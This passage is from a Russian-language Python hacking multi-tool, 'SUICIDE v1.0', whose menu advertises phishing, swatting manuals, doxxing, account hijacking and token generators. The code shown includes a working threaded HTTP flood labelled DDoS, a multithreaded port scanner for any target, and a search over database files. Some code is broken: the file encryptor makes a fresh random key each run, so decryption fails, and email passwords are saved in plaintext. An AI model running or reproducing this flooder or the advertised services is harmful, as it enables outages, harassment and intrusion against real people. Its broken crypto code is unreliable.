                print(Colorate.Vertical(Colors.cyan_to_green, f"  [+] Маска подсети: {addr.netmask}"))
                print(Colorate.Vertical(Colors.cyan_to_green, f"  [+] Шлюз: {addr.broadcast}"))
            elif addr.family == psutil.AF_LINK:
                print(Colorate.Vertical(Colors.cyan_to_green, f"  [+] MAC адрес: {addr.address}"))

def shorten_url():
    long_url = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите ссылку для сокращения: "))
    api_url = f"http://tinyurl.com/api-create.php?url={long_url}"
    response = requests.get(api_url)
    if response.status_code == 200:
        print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Сокращённая ссылка: {response.text}"))
    else:
        print(Colorate.Vertical(Colors.cyan_to_green, "[-] Ошибка: Не удалось сократить ссылку"))

def translate_text():
    languages = {
        'английский': 'en',  
        'испанский': 'es',  
        'французский': 'fr',  
        'немецкий': 'de',  
        'итальянский': 'it',  
        'украинский': 'uk',
        'португальский': 'pt',
        'китайский (упрощенный)': 'zh-CN',
        'китайский (традиционный)': 'zh-TW',
        'японский': 'ja',
        'корейский': 'ko',
        'финский': 'fi',
        'греческий': 'el',
        'сербский': 'sr',
        'турецкий': 'tr',
        'венгерский': 'hu',
        'вьетнамский': 'vi',
        'исландский': 'is',
        'нидерландский': 'nl',
        'польский': 'pl',
        'тайский': 'th',
        'датский': 'da',
        'норвежский': 'no',
    }

    print(Colorate.Vertical(Colors.cyan_to_green, "\n[?] Выберите язык для перевода:"))
    for index, (language, code) in enumerate(languages.items(), start=1):
        print(Colorate.Vertical(Colors.cyan_to_green, f"{index}. {language}"))

    choice = input(Colorate.Vertical(Colors.cyan_to_green, "\n[?] Введите номер языка: "))

    try:
        choice = int(choice)
        if choice < 1 or choice > len(languages):
            raise ValueError
    except ValueError:
        print(Colorate.Vertical(Colors.cyan_to_green, "[-] Некорректный выбор. Попробуйте снова."))
        return

    target_language = list(languages.values())[choice - 1]

    text_to_translate = input(Colorate.Vertical(Colors.cyan_to_green, "\n[?] Введите текст для перевода с русского языка: "))

    translator = GoogleTranslator(source='ru', target=target_language)
    translated_text = translator.translate(text_to_translate)
    
    print(Colorate.Vertical(Colors.cyan_to_blue, f"\n[+] Переведенный текст: {translated_text}"))

def generate_hash():
    data = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите данные для хеширования: "))
    hash_object = hashlib.sha256()
    hash_object.update(data.encode())
    hashed_data = hash_object.hexdigest()
    print(Colorate.Vertical(Colors.cyan_to_green, "[+] Хеш данных:", hashed_data))

def encrypt_decrypt_file():
    key = get_random_bytes(16)
    
    cipher = AES.new(key, AES.MODE_ECB)
    
    mode = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Выберите режим: \n1. Шифрование \n2. Расшифрование\n"))
    
    if mode == "1":
        input_file = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите имя входного файла: "))
        output_file_encrypted = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите имя выходного зашифрованного файла: "))
        
        with open(input_file, 'rb') as f_in:
            with open(output_file_encrypted, 'wb') as f_out:
                while True:
                    data = f_in.read(16)
                    if not data:
                        break
                    if len(data) % 16 != 0:
                        data += b' ' * (16 - len(data) % 16)
                    encrypted_data = cipher.encrypt(data)
                    f_out.write(encrypted_data)
        print(Colorate.Vertical(Colors.cyan_to_green, "[+] Файл успешно зашифрован."))
    
    elif mode == "2":
        input_file = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите имя входного зашифрованного файла: "))
        output_file_decrypted = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите имя выходного расшифрованного файла: "))
        
        with open(input_file, 'rb') as f_in:
            with open(output_file_decrypted, 'wb') as f_out:
                while True:
                    encrypted_data = f_in.read(16)
                    if not encrypted_data:
                        break
                    decrypted_data = cipher.decrypt(encrypted_data)
                    f_out.write(decrypted_data.strip())
        print(Colorate.Vertical(Colors.cyan_to_green, "[+] Файл успешно расшифрован."))

def encrypt_decrypt_base64():
    xyi = int(input(Colorate.Vertical(Colors.cyan_to_green, "[?] Выберите действие (1 - шифрование, 2 - расшифрование): ")))

    if xyi == 1:
        text = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите текст для шифрования: "))
        encrypted_text = base64.b64encode(text.encode()).decode()
        print(Colorate.Vertical(Colors.cyan_to_green, "[+] Зашифрованный текст:", encrypted_text))
    elif xyi == 2:
        text = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите текст для расшифрования: "))
        decrypted_text = base64.b64decode(text).decode()
        print(Colorate.Vertical(Colors.cyan_to_green, "[+] Расшифрованный текст:", decrypted_text))
    else:
        print(Colorate.Vertical(Colors.cyan_to_green, "[-] Неправильный выбор. Введите 1 для шифрования и 2 для расшифрования."))

def monitor_network_traffic(interval=1):
    def bytes_to_human(n):
        symbols = ('K', 'M', 'G', 'T', 'P', 'E', 'Z', 'Y')
        prefix = {}
        for i, s in enumerate(symbols):
            prefix[s] = 1 << (i + 1) * 10
        for s in reversed(symbols):
            if n >= prefix[s]:
                value = float(n) / prefix[s]
                return f'{value:.1f} {s}'
        return f"{n} B"

    old_value = psutil.net_io_counters()
    print(Colorate.Vertical(Colors.cyan_to_green, "[+] Начало мониторинга сетевого трафика (нажмите Ctrl+C для выхода)"))
    try:
        while True:
            time.sleep(interval)
            new_value = psutil.net_io_counters()
            sent = bytes_to_human(new_value.bytes_sent - old_value.bytes_sent)
            recv = bytes_to_human(new_value.bytes_recv - old_value.bytes_recv)
            print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Отправлено: {sent}, Получено: {recv}\n"))
            old_value = new_value
    except KeyboardInterrupt:
        print(Colorate.Vertical(Colors.cyan_to_green, "[+] Мониторинг остановлен"))

def get_my_ip():
    try:
        response = requests.get('https://httpbin.org/ip')
        ip_info = response.json()
        print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Ваш IP: {ip_info['origin']}"))
    except Exception as e:
        print(Colorate.Vertical(Colors.cyan_to_green, f"[-] Произошла ошибка: {e}"))

def port_scan_v2():
    init()
    target = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите IP-адрес: "))

    def scan_thread():
        while True:
            port = ports_queue.get()
            port_scan(port)
            ports_queue.task_done()

    def port_scan(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            with print_lock:
                if result == 0:
                    print(Fore.GREEN + f"[+] Порт {port} открыт" + Style.RESET_ALL)
                    open_ports.append(port)
                else:
                    print(Fore.RED + f"[-] Порт {port} закрыт" + Style.RESET_ALL)
        except:
            pass
        finally:
            sock.close()

    print_lock = threading.Lock()
    n_threads = 200
    ports = range(1, 9999)
    open_ports = []

    targetIP = socket.gethostbyname(target)
    ports_queue = Queue()

    for t in range(n_threads):
        thread = threading.Thread(target=scan_thread)
        thread.daemon = True
        thread.start()

    for port in ports:
        ports_queue.put(port)

    ports_queue.join()

    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Открытых портов: {len(open_ports)}"))

    with open('open_ports.txt', 'w') as file:
        for port in open_ports:
            file.write(str(port) + '\n')

    print(Colorate.Vertical(Colors.cyan_to_green, "[+] Информация о открытых портах сохранена в файл open_ports.txt"))

def generate_qr_code():
    data = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите данные для QR-кода: "))
    file_path = os.path.join(os.getcwd(), "qrcode.png")

    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )

    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill='black', back_color='white')
    img.save(file_path)

    print(Colorate.Vertical(Colors.cyan_to_green, f"[+] QR-код сохранен в {file_path}"))

def download_tiktok_video():
    url = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите ссылку на TikTok видео: "))

    def get_tiktok_video_id(url):
        match = re.search(r'/video/(\d+)', url)
        if match:
            return match.group(1)
        else:
            raise ValueError("[-] Не удалось извлечь ID видео из URL")

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    session = requests.Session()
    response = session.get(url, headers=headers, allow_redirects=True)
    
    video_id = get_tiktok_video_id(response.url)
    print(Colorate.Vertical(Colors.cyan_to_green, f"Сыллка на видео {response.url}"))

    video_url = f'https://tikcdn.io/ssstik/{video_id}'
    response = session.get(video_url, headers=headers)
    
    if response.status_code == 200:
        print(Colorate.Vertical(Colors.cyan_to_green, "[+] Успешно! Видео скачено"))
        with open(f"{video_id}.mp4", "wb") as file:
            file.write(response.content)
        print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Видео успешно сохранено как '{video_id}.mp4'"))
    else:
        print(Colorate.Vertical(Colors.cyan_to_green, f"[-] Не удалось загрузить видео. Код ошибки: {response.status_code}"))
        return None

def download_youtube_video():
    try:
        url = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите URL YouTube видео: "))
        yt = YouTube(url)
        stream = yt.streams.get_highest_resolution()
        output_filename = yt.title + ".mp4"
        stream.download(filename=output_filename)
        print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Видео '{yt.title}' успешно загружено"))
    except Exception as e:
        print(Colorate.Vertical(Colors.cyan_to_green, f"[-] Произошла ошибка: {e}"))

def get_ip_address():
    url = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите URL: "))
    
    try:
        host = url.split("//")[-1].split("/")[0]
        ip_address = socket.gethostbyname(host)
        print(Colorate.Vertical(Colors.cyan_to_green, f"[+] IP-адрес для {url}: {ip_address}"))
    except socket.gaierror:
        print(Colorate.Vertical(Colors.cyan_to_green, "[-] Не удалось получить IP-адрес"))

def send_email():
    credentials_file = "email.json"
    
    if not os.path.exists(credentials_file):
        email = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите вашу почту: "))
        password = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите ваш пароль: "))
        
        with open(credentials_file, "w") as file:
            json.dump({"email": email, "password": password}, file)
    else:
        with open(credentials_file, "r") as file:
            credentials = json.load(file)
            email = credentials["email"]
            password = credentials["password"]
    
    domain = email.split('@')[1]
    smtp_server = f"smtp.{domain}"
    
    to_email = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите почту получателя: "))
    subject = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите тему письма: "))
    message_text = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите текст письма: "))

    message = MIMEMultipart()
    message["From"] = email
    message["To"] = to_email
    message["Subject"] = subject
    message.attach(MIMEText(message_text, "plain"))
    
    try:
        with smtplib.SMTP(smtp_server, 587) as server:
            server.starttls()
            server.login(email, password)
            server.sendmail(email, to_email, message.as_string())
        print(Colorate.Vertical(Colors.cyan_to_green, "[+] Письмо успешно отправлено!"))
    except Exception as e:
        print(Colorate.Vertical(Colors.cyan_to_green, f"[-] Ошибка при отправке письма: {e}"))

def hlr_requests(url):
    webbrowser.open_new_tab(url)

def download_and_extract_github_repo():
    repo_url = input(Colorate.Vertical(Colors.cyan_to_green, "[?] Введите URL репозитория GitHub: "))

    repo_name = repo_url.rstrip('/').split('/')[-1]
    if repo_name.endswith('.git'):
        repo_name = repo_name[:-4]

    zip_url = f"{repo_url}/archive/refs/heads/main.zip"

    try:
        response = requests.get(zip_url)
        response.raise_for_status()
        
        zip_path = os.path.join(os.getcwd(), f"{repo_name}.zip")

        with open(zip_path, 'wb') as zip_file:
            zip_file.write(response.content)
        print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Zip-архив репозитория сохранен в {zip_path}"))

        with ZipFile(BytesIO(response.content)) as zip_ref:
            zip_ref.extractall(os.getcwd())
        print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Репозиторий извлечен в {os.getcwd()}"))

    except requests.exceptions.RequestException as e:
        print(Colorate.Vertical(Colors.cyan_to_green, f"[-] Ошибка при скачивании репозитория: {e}"))
    except zipfile.BadZipFile as e:
        print(Colorate.Vertical(Colors.cyan_to_green, f"[-] Ошибка при извлечении репозитория: {e}"))

def termux_posobye(url):
    webbrowser.open_new_tab(url)

banner = """
                
                                                                             ▄████████ ███    █▄   ▄█   ▄████████  ▄█  ████████▄     ▄████████ 
                                                                            ███    ███ ███    ███ ███  ███    ███ ███  ███   ▀███   ███    ███ 
                                                                            ███    █▀  ███    ███ ███▌ ███    █▀  ███▌ ███    ███   ███    █▀  
                                                                            ███        ███    ███ ███▌ ███        ███▌ ███    ███  ▄███▄▄▄     
                                                                          ▀███████████ ███    ███ ███▌ ███        ███▌ ███    ███ ▀▀███▀▀▀     
                                                                                   ███ ███    ███ ███  ███    █▄  ███  ███    ███   ███    █▄  
                                                                             ▄█    ███ ███    ███ ███  ███    ███ ███  ███   ▄███   ███    ███ 
                                                                           ▄████████▀  ████████▀  █▀   ████████▀  █▀   ████████▀    ██████████ 
                                                                                                                                                                                                       

 """

menu = """
               ███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
               ██             SUICIDE v1.0              ██          SUICIDE v1.0                 ██            SUICIDE v1.0               ██             SUICIDE v1.0              ██             SUICIDE v1.0              ██                                           
               ██              @ReaperSoft              ██         @forever_termux               ██             @ReaperSoft               ██            @forever_termux            ██              @ReaperSoft              ██
               ███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
               ██ [1] Поиск по номеру                   ██                                       ██ [41] Скачать видео в ТикТок           ██ [61] Мануал по свату 1                ██ [81] Мануал по взлому ВК              ██
               ██ [2] Поиск по сайту                    ██ [22] Фишинг Глаз Бога                 ██ [42] Скачать видео в YouTube          ██ [62] Мануал по свату 2                ██ [82] Абуз Гб сабки                    ██
               ██ [3] Поиск по IP                       ██ [23] Фишинг Накрутка                  ██ [43] Узнать IP по URL                 ██ [63] Мануал по свату 3                ██ [83] Мануал докс по вирту             ██
               ██ [4] Поиск по БД                       ██ [24] Фишинг Анонимный чат             ██ [44] Отправка письма с вашей почты    ██ [64] Что делать если вас сватнули?    ██ [84] Телеграм канал с базами данных   ██
               ██ [5] DDoS                              ██ [25] Список базы данных               ██ [45] Генерировать Украинские номера   ██ [65] Мануал по сносу сессий           ██ [85] Как определить защиту  сайта?    ██
               ██ [7] Текст банворд                     ██ [27] Рейд бот телеграм                ██ [47] Проверка номера HLR-запросом     ██ [67] Как писать доносы?               ██ [87] Вычисление по Discord            ██
               ██ [8] Генератор паролей                 ██ [28] Логгер изображение дискорд       ██ [48] Скачать репозиторий из github    ██ [68] Мануал по вытягиванию логов с тг ██ [88] Мануал  по анонимности           ██
               ██ [9] Генератор вымышленной личности    ██ [29] Спам вебхук                      ██ [49] Пособие для Termux               ██ [69] Мануал по написанию утилит       ██ [89] Обход бана по железу             ██
               ██ [10] Web-crawler                      ██ [30] Генератор Mac адресов            ██ [50] Мануал по анонимности 1          ██ [70] Мануал по сносу тг и тгк         ██ [90] Мануал по взлому MailRu          ██
               ██ [11] Генератор банковских карт        ██ [31] Генератор почт                   ██ [51] Мануал по анонимности 2          ██ [71] Мануал поиск по фото             ██ [91] Вытягивание логов                ██
               ██ [12] Поиск по Mac-Address             ██ [32] Пинг                             ██ [52] Мануал по анонимности 3          ██ [72] Мануал поиск по ID Telegram      ██ [92] Парсер чатов телеграм или канала ██
               ██ [13] Порт сканер                      ██ [33] Сократить ссылку                 ██ [53] Мануал по деанону 1              ██ [73] Виртуальные номера               ██ [93] Мануал по сносу ВК               ██
               ██ [14] Генератор User-agent             ██ [34] Переводчик                       ██ [54] Мануал по деанону 2              ██ [74] Узнаем адрес                     ██ [94] Мануал по сносу телеграм 1       ██
               ██ [15] Генератор ключей Mullvad Vpn     ██ [35] Генератор хэш-данных             ██ [55] Мануал по деанону 3              ██ [75] Снятие Spam Block                ██ [95] Мануал по сносу телеграм 2       ██
               ██ [16] Генератор токенов дискорд        ██ [36] Шифрование и дешифрование Base64 ██ [56] Мануал по пробиву IP             ██ [76] Урок как поменять IP             ██ [96] Мануал по сносу телеграм 3       ██
               ██ [17] Генератор номеров РФ             ██ [37] Мониторинг сетевого трафика      ██ [57] Мануал OSINT                     ██ [77] Как сделать фейк личность?       ██ [97] Текста для свата                 ██
               ██ [18] Скрапер прокси                   ██ [38] Узнать свой ip                   ██ [58] Мануал по поиску                 ██ [78] Мануал по верификации кошелька   ██ [98] Разработчик                      ██
               ██ [19] Репортер ТГ через сайт           ██ [39] Порт сканер V2                   ██ [59] Мануал как сделать TOR анонимным ██ [79] Мануал по угону юзеров           ██ [99] Ссылка на канал                  ██
               ██ [20] Поиск по интернету [GOOGLE]      ██ [40] Генератор QR кода                ██ [60] Мануал по DDOS                   ██ [80] Как засрать данные в гб?         ██ [100] Выйти                           ██
               ██ [21] Информация о почте               ██                                       ██ [61] Мануал по свату 1                ██                                       ██                                       ██
               ██                                       ██                                       ██ [62] Мануал по свату 2                ██                                       ██                                       ██  
               ██                                       ██                                       ██ [63] Мануал по свату 3                ██                                       ██                                       ██    
               ██                                       ██                                       ██ [64] Что делать если вас сватнули?    ██                                       ██                                       ██  
               ██                                       ██                                       ██ [65] Мануал по сносу сессий           ██                                       ██                                       ██   
               ██                                       ██                                       ██ [67] Как писать доносы?               ██                                       ██                                       ██   
               ██                                       ██                                       ██ [68] Мануал по вытягиванию логов с тг ██                                       ██                                       ██    
               ██                                       ██                                       ██                                       ██                                       ██                                       ██
               ███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
"""
                        
while True:
            clear_console()
            print(Center.XCenter(Colorate.Horizontal(Colors.cyan_to_green, banner)))
            print(Center.XCenter(Colorate.Horizontal(Colors.cyan_to_green, menu)))
            choice = input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Введите номер опции:  "))
            clear_console()
            print(Center.XCenter(Colorate.Horizontal(Colors.cyan_to_green, banner)))
            if choice == "1":
                print(Colorate.Vertical(Colors.red_to_white, "[!] У этой опции есть лимиты используйте ее с умом. Либо используйте VPN и меняйте свое IP\n\n"))
                user_number = input(Colorate.Vertical(Colors.cyan_to_green, "[+] Введите номер телефона (например, +79833170773): ").strip())
                print()
                search_phone_number(user_number)
                input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == "2":
                domain = pystyle.Write.Input("\n[?] Введите сайт -> ", pystyle.Colors.cyan_to_green, interval = 0.005)
                def get_website_info(domain):
                    domain_info = whois.whois(domain)
                    print_string = f"""
[+] Домен: {domain_info.domain_name}
[+] Зарегистрирован: {domain_info.creation_date}
[+] Истекает: {domain_info.expiration_date}  
[+] Владелец: {domain_info.registrant_name}
[+] Организация: {domain_info.registrant_organization}
[+] Адрес: {domain_info.registrant_address}
[+] Город: {domain_info.registrant_city}
[+] Штат: {domain_info.registrant_state}
[+] Почтовый индекс: {domain_info.registrant_postal_code}
[+] Страна: {domain_info.registrant_country}
[+] IP-адрес: {domain_info.name_servers}
        """
                    pystyle.Write.Print(print_string, pystyle.Colors.cyan_to_green, interval=0.005)
                get_website_info(domain)
                input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == "3":
                def get_whois_info(ip_address):
                    url = f"https://www.whois.com/whois/{ip_address}"
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
                    }
                    response = requests.get(url, headers=headers)
                    soup = BeautifulSoup(response.content, "html.parser")

                    data = soup.find("div", class_="df-block")
                    if data:
                        registry_data = data.find("pre", {"id": "registryData"})
                        registrar_data = data.find("pre", {"id": "registrarData"})

                        whois_info = ""
                        if registry_data:
                            whois_info += registry_data.get_text() + "\n"
                        if registrar_data:
                            whois_info += registrar_data.get_text() + "\n"

                        headers = data.find_all("div", class_="d-flex")
                        for header in headers:
                            whois_info += header.get_text() + "\n"

                        return whois_info
                    else:
                        return "Не удалось получить информацию whois для данного IP-адреса."

                ip_address = input(Colorate.Vertical(Colors.cyan_to_green, "Введите IP-адрес: "))
                whois_info = get_whois_info(ip_address)
                print()
                print(Colorate.Vertical(Colors.cyan_to_green, whois_info))
                input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == "4":
                path = pystyle.Write.Input("\n[?] Введите путь к БД: ", pystyle.Colors.cyan_to_green, interval=0.005)
                search_text = pystyle.Write.Input("\n[?] Введите текст:  ", pystyle.Colors.cyan_to_green, interval=0.005)
                print()
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        for line in f:
                            if search_text in line:
                                pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.cyan_to_green, interval=0.005)
                                print()
                                break
                        else:
                            pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.cyan_to_green, interval=0.005)
                except:
                    try:
                        with open(path, "r", encoding="cp1251") as f:
                            for line in f:
                                if search_text in line:
                                    pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.cyan_to_green, interval=0.005)
                                    print()
                                    break
                            else:
                                pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.cyan_to_green, interval=0.005)
                    except:
                        try:
                            with open(path, "r", encoding="cp1252") as f:
                                for line in f:
                                    if search_text in line:
                                        pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.cyan_to_green, interval=0.005)
                                        print()
                                        break
                                else:
                                    pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.cyan_to_green, interval=0.005)
                        except:
                            pystyle.Write.Print(f"[!] Произошла ошибка, проверьте ввод данных\n", pystyle.Colors.cyan_to_green, interval=0.005)
                            input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == "5":
                url = pystyle.Write.Input("[?] URL: ", pystyle.Colors.cyan_to_green, interval=0.005)
                num_requests = int(
                    pystyle.Write.Input(
                        "[?] Введите количество запросов: ", pystyle.Colors.cyan_to_green, interval=0.005
                    )
                )
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
                ]
                def send_request(i):
                    user_agent = random.choice(user_agents)
                    headers = {"User-Agent": user_agent}
                    try:
                        response = requests.get(url, headers=headers)
                        print(Colorate.Vertical(Colors.cyan_to_green, f"{colorama.Fore.cyan_to_green}[+] Request {i} sent successfully\n"))
                    except:
                        print(Colorate.Vertical(Colors.cyan_to_green, f"[+] Request {i} sent successfully\n"))
                threads = []
                for i in range(1, num_requests + 1):
                    t = threading.Thread(target=send_request, args=[i])
                    t.start()
                    threads.append(t)
                for t in threads:
                    t.join()
                input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == "6":
                def get_proxy():
                    proxy_api_url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"

                    try:
                        response = requests.get(proxy_api_url)
                        if response.status_code == 200:
                            proxy_list = response.text.strip().split("\r\n")
                            return proxy_list
                        else:
                            pystyle.Write.Print(f"\nПроизошла ошибка -> {response.status_code}", pystyle.Colors.cyan_to_green, interval=0.005)
                    except Exception as e:
                        pystyle.Write.Print(f"\nПроизошла ошибка -> {str(e)}", pystyle.Colors.cyan_to_green, interval=0.005)

                    return None

                proxies = get_proxy()
                if proxies:
                    pystyle.Write.Print("\nПрокси:\n", pystyle.Colors.cyan_to_green, interval=0.005)
                    for proxy in proxies:
                        pystyle.Write.Print("\n" + proxy, pystyle.Colors.cyan_to_green, interval=0.005)
                    print()
                else:
                    pystyle.Write.Print("Прокси недоступно.", pystyle.Colors.cyan_to_green, interval=0.005)
                    input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == "7":
                def transform_text(input_text):
                    translit_dict = {
                        "а": "@",
                        "б": "Б",
                        "в": "B",
                        "г": "г",
                        "д": "д",
                        "е": "е",
                        "ё": "ё",
                        "ж": "ж",
                        "з": "3",
                        "и": "u",
                        "й": "й",
                        "к": "K",
                        "л": "л",
                        "м": "M",
                        "н": "H",
                        "о": "0",
                        "п": "п",
                        "р": "P",
                        "с": "c",
                        "т": "T",
                        "у": "y",
                        "ф": "ф",
                        "х": "X",
                        "ц": "ц",
                        "ч": "4",
                        "ш": "ш",
                        "щ": "щ",
                        "ъ": "ъ",
                        "ы": "ы",
                        "ь": "ь",
                        "э": "э",
                        "ю": "ю",
                        "я": "я",
                        "А": "A",
                        "Б": "6",
                        "В": "V",
                        "Г": "r",
                        "Д": "D",
                        "Е": "E",
                        "Ё": "Ё",
                        "Ж": "Ж",
                        "З": "2",
                        "И": "I",
                        "Й": "Й",
                        "К": "K",
                        "Л": "Л",
                        "М": "M",
                        "Н": "H",
                        "О": "O",
                        "П": "П",
                        "Р": "P",
                        "С": "C",
                        "Т": "T",
                        "У": "Y",
                        "Ф": "Ф",
                        "Х": "X",
                        "Ц": "Ц",
                        "Ч": "Ч",
                        "Ш": "Ш",
                        "Щ": "Щ",
                        "Ъ": "Ъ",
                        "Ы": "bl",
                        "Ь": "b",
                        "Э": "Э",
                        "Ю": "9Y",
                        "Я": "9A",
                    }
                    transformed_text = []
                    for char in input_text:
                        if char in translit_dict:
                            transformed_text.append(translit_dict[char])
                        else:
                            transformed_text.append(char)
                    return "".join(transformed_text)
                input_text = pystyle.Write.Input("\n[?] Введите текст -> ", pystyle.Colors.cyan_to_green, interval=0.005)
                transformed_text = transform_text(input_text)
                print()
                pystyle.Write.Print("[+] Результат -> " + transformed_text + "\n", pystyle.Colors.cyan_to_green, interval=0.005)
                input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == "8":
                def get_characters(complexity):
                    characters = string.ascii_letters + string.digits
                    if complexity == "medium":
                        characters += "!@#$%^&*()"
                    elif complexity == "high":
                        characters += string.punctuation
                    return characters
                def generate_password(length, complexity):
                    characters = get_characters(complexity)
                    password = "".join(random.choice(characters) for i in range(length))
                    return password
                password_length = int(
                    pystyle.Write.Input("[?] Введите длину пароля -> ", pystyle.Colors.cyan_to_green, interval=0.005)
                )
                complexity = pystyle.Write.Input(
                    "[?] Выберите сложность (low, medium, high): ", pystyle.Colors.cyan_to_green, interval=0.005)
                print()
                complex_password = generate_password(password_length, complexity)
                pystyle.Write.Print("[+] Пароль -> "+ complex_password + "\n", pystyle.Colors.cyan_to_green, interval=0.005)
                input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '13':
                pystyle.Write.Print("\n[?] Выберите режим: ", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print("\n\n[?] 1 - проверить часто используемые порты", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print("\n\n[?] 2 - проверить указанный порт", pystyle.Colors.cyan_to_green, interval=0.005)
                mode = pystyle.Write.Input("\n\n[?] Ваш выбор: ", pystyle.Colors.cyan_to_green, interval=0.005)
                if mode == "1":
                    print()
                    ports = [
                        20,
                        26,
                        28,
                        29,
                        55,
                        53,
                        80,
                        110,
                        443,
                        8080,
                        1111,
                        1388,
                        2222,
                        1020,
                        4040,
                        6035,
                    ]
                    for port in ports:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        result = sock.connect_ex(("127.0.0.1", port))
                        if result == 0:
                            pystyle.Write.Print(f"[+] Порт {port} открыт", pystyle.Colors.cyan_to_green, interval=0.005)
                        else:
                            pystyle.Write.Print(f"[+] Порт {port} закрыт", pystyle.Colors.cyan_to_green, interval=0.005)
                        sock.close()
                        print()
                    input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
                elif mode == "2":
                    port = pystyle.Write.Input("\n[?] Введите номер порта: ", pystyle.Colors.cyan_to_green, interval=0.005)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    result = sock.connect_ex(("127.0.0.1", int(port)))
                    print()
                    if result == 0:
                        pystyle.Write.Print(f"[+] Порт {port} открыт", pystyle.Colors.cyan_to_green, interval=0.005)
                        input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
                    else:
                        pystyle.Write.Print(f"[+] Порт {port} закрыт", pystyle.Colors.cyan_to_green, interval=0.005)
                    sock.close()
                    print()
                    input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
                else:
                    pystyle.Write.Print("\n[!] Неизвестный режим", pystyle.Colors.cyan_to_green, interval=0.005)
                    print()
                    input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == "9":
                fake = faker.Faker(locale="ru_RU")
                gender = pystyle.Write.Input("\n[?] Введите пол (М - мужской, Ж - женский): ", pystyle.Colors.cyan_to_green, interval=0.005)
                print()
